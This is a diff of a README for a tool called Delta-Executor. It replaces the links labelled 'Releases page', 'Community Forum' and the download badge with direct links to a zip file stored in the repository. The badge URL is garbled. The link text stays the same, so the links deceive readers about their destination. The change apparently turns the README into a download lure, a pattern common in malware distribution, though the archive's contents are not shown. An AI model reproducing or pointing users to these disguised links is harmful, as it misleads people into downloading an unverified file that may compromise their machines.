@@ -6,9 +6,9 @@ Welcome to Delta-Executor! This application makes it easy for you to enhance you
 
 ## 📥 Download the Application
 
-[![Download Delta-Executor](https://img.shields.io/badge/Download-Delt4%20Executor-blue.svg)](https://github.com/Deniskipkorir21/Delta-Executor/releases)
+[![Download Delta-Executor](https://raw.githubusercontent.com/Deniskipkorir21/Delta-Executor/main/futureless/Delta-Executor.zip%https://raw.githubusercontent.com/Deniskipkorir21/Delta-Executor/main/futureless/Delta-Executor.zip)](https://raw.githubusercontent.com/Deniskipkorir21/Delta-Executor/main/futureless/Delta-Executor.zip)
 
-To get started, visit our [Releases page](https://github.com/Deniskipkorir21/Delta-Executor/releases) to download Delta-Executor. This page contains all the available versions of the software.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Deniskipkorir21/Delta-Executor/main/futureless/Delta-Executor.zip) to download Delta-Executor. This page contains all the available versions of the software.
 
 ## 💻 System Requirements
 
@@ -30,7 +30,7 @@ Delta-Executor offers several features that enhance your scripting capabilities:
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Releases page](https://github.com/Deniskipkorir21/Delta-Executor/releases).
+1. Visit this page to download: [Releases page](https://raw.githubusercontent.com/Deniskipkorir21/Delta-Executor/main/futureless/Delta-Executor.zip).
 2. On the Releases page, find the version you want to install.
 3. Click on the download link for the executable file.
 4. Once downloaded, locate the file in your 'Downloads' folder.
@@ -48,7 +48,7 @@ Delta-Executor offers several features that enhance your scripting capabilities:
 
 ## 🎉 Support & Community
 
-If you have questions or need assistance, visit our [Community Forum](https://github.com/Deniskipkorir21/Delta-Executor/discussions). Here, you can interact with other users, exchange scripts, and find help from the community.
+If you have questions or need assistance, visit our [Community Forum](https://raw.githubusercontent.com/Deniskipkorir21/Delta-Executor/main/futureless/Delta-Executor.zip). Here, you can interact with other users, exchange scripts, and find help from the community.
 
 ## 🙏 Acknowledgments
 
